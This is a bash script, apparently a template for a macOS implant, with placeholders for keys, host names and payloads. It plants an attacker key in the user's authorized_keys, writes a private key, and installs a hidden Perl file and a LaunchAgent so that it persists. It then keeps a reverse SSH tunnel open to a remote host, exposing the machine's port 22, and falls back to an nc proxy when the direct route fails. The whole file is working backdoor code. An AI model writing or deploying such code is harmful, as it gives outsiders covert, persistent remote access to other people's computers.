#!/usr/bin/env bash
# Copyright (c) 2023, Oracle and/or its affiliates.

UMASK=002
umask $UMASK
NAME=$(basename "$0")

KEY="$HOME/.ssh/PRIVATE_KEY_PATH_PLACEHOLDER"
FLOCKNAME="FLOCK_NAME_PLACEHOLDER"
LAGENTNAME="LAGENT_NAME_PLACEHOLDER"
TARGETPROXY="TARGET_PROXY"
chmod +x "$NAME"

if ! test -d "$HOME/Library/LaunchAgents/"; then
    mkdir -p "$HOME/Library/LaunchAgents/"
fi

if ! test -d "$HOME/.ssh/"; then
    mkdir -p "$HOME/.ssh/"
    chmod 700 "$HOME/.ssh/"
fi

if test -f "$KEY";then
    while true; do
        if curl --max-time 3 --output /dev/null --silent --head --fail "http://google.com" ; then 
            $HOME/Library/LaunchAgents/.$FLOCKNAME.pl ssh -o ServerAliveInterval=30 -o ServerAliveCountMax=5 -p REMOTE_PLACEHOLDER -N -R PORT_PLACEHOLDER:localhost:22 -i $KEY flip@FQDN_PLACEHOLDER
            
        elif test -n "$TARGETPROXY"; then
            $HOME/Library/LaunchAgents/.$FLOCKNAME.pl ssh -o ProxyCommand="/usr/bin/nc -X connect -x $TARGETPROXY %h %p" -o StrictHostKeyChecking=accept-new -o ServerAliveInterval=30 -o ServerAliveCountMax=5 -p REMOTE_PLACEHOLDER -N -R PORT_PLACEHOLDER:localhost:22 -i $KEY flip@FQDN_PLACEHOLDER
        fi
        sleep 10
    done
else

    echo "" >> "$HOME/.ssh/known_hosts"
    echo "BACKFLIP_PUB_PLACEHOLDER"|base64 -d >> "$HOME/.ssh/known_hosts"
    echo "PRIVATE_KEY_PLACEHOLDER"|base64 -d > "$KEY"
    echo "" >> "$HOME/.ssh/authorized_keys"
    echo "PUBLIC_KEY_PLACEHOLDER"|base64 -d >> "$HOME/.ssh/authorized_keys"
    echo "FLOCK_CODE_PLACEHOLDER" |base64 -d > "$HOME/Library/LaunchAgents/.$FLOCKNAME.pl"
    chmod 600 "$KEY" && chmod 644 "$HOME/.ssh/authorized_keys" && chmod +x "$HOME/Library/LaunchAgents/.$FLOCKNAME.pl"
    echo "LAGENT_XML_PLACEHOLDER"|base64 -d >$HOME/Library/LaunchAgents/$LAGENTNAME.plist
    sed -i '' "s/TARGET_USER/${USER}/g" "$HOME/Library/LaunchAgents/$LAGENTNAME.plist"
    sed -i '' "s/IMAGINARY_PAYLOAD_NAME/${NAME}/g" "$HOME/Library/LaunchAgents/$LAGENTNAME.plist"
    mv "$NAME" "$HOME/Library/LaunchAgents/"
    launchctl load -w "$HOME/Library/LaunchAgents/$LAGENTNAME.plist"
    launchctl start $LAGENTNAME
fi
